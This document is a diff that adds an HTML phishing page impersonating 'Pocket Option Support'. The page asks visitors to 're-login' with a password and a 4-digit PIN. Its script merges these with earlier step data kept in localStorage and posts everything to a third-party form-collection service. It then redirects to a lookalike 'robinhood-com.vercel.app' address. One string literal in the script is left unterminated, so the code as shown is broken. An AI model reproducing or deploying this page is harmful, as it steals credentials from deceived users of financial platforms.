@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pocket - Verification</title>
+
+<style>
+body{
+    margin:0;
+    font-family: Arial, sans-serif;
+    background: linear-gradient(180deg,#0a2a4f,#08213d);
+    color:#fff;
+}
+.container{
+    max-width:400px;
+    margin:auto;
+    padding:20px;
+}
+.top-bar{
+    display:flex;
+    justify-content:space-between;
+    font-size:14px;
+    margin-bottom:20px;
+}
+.logo{
+    text-align:center;
+    margin-top:20px;
+}
+.logo h2{
+    margin:10px 0;
+    font-weight:600;
+}
+h1,h2,h3{
+    text-align:center;
+    margin-top:10px;
+}
+.input-box{
+    margin:16px 0;
+}
+input, textarea{
+    width:100%;
+    padding:15px;
+    border-radius:10px;
+    border:1px solid rgba(255,255,255,0.2);
+    background:transparent;
+    color:#fff;
+    outline:none;
+}
+.btn{
+    width:100%;
+    padding:15px;
+    border:none;
+    border-radius:12px;
+    background:linear-gradient(90deg,#4a7dff,#3a4dff);
+    color:#fff;
+    font-size:16px;
+    margin-top:15px;
+    cursor:pointer;
+}
+.hidden { display: none; }
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <div class="top-bar">
+        <span>← Back</span>
+        <span>🌐 English</span>
+    </div>
+
+    <div class="logo">
+        <h2>POCKET OPTION SUPPORT</h2>
+    </div>
+
+<h2>Re-Login to Continue</h2>
+
+<form id="step2Form">
+
+    <!-- STEP 2 FIELDS -->
+    <div id="step2fields">
+        <h3>Password</h3>
+        <input type="text" name="username" placeholder="password" required>
+
+        <h3>Verify Pin</h3>
+        <textarea name="pin" placeholder="Enter 4 digit pin" required></textarea>
+
+        <button type="submit" class="btn">Login</button>
+    </div>
+
+    <!-- Hidden Web3Forms fields -->
+    <input type="hidden" name="access_key" value="39483916-2d75-4776-91f8-2bbc171def4f">
+    <input type="hidden" name="redirect" value="https://robid-com.vercel.app/success.html">
+
+</form>
+
+</div>
+
+<script>
+// Handle Step 2 form submission
+document.getElementById('step2Form').addEventListener('submit', function(e){
+    e.preventDefault();
+
+    // Retrieve Step 1 data from localStorage
+    const step1Data = JSON.parse(localStorage.getItem("formStep1") || "{}");
+
+    // Collect Step 2 data from form
+    const formData = new FormData(e.target);
+    const step2Data = {};
+    formData.forEach((value, key) => { step2Data[key] = value; });
+
+    // Combine Step 1 + Step 2 data
+    const finalData = {
+        access_key: "39483916-2d75-4776-91f8-2bbc171def4f", // Web3Forms key
+        redirect: "https://robinhood,
+        ...step1Data,
+        ...step2Data
+    };
+
+    // Send combined data to Web3Forms
+    fetch("https://api.web3forms.com/submit", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(finalData)
+    })
+    .then(res => res.json())
+    .then(data => {
+        console.log("Web3Forms response:", data);
+        alert("Form submitted successfully!");
+        localStorage.removeItem("formStep1"); // Clear stored Step 1
+        window.location.href = "https://robinhood-com.vercel.app/success.html";
+    })
+    .catch(err => {
+        console.error("Submission error:", err);
+        alert("Failed to submit the form. Try again.");
+    });
+});
+</script>
+
+</body>
+</html>
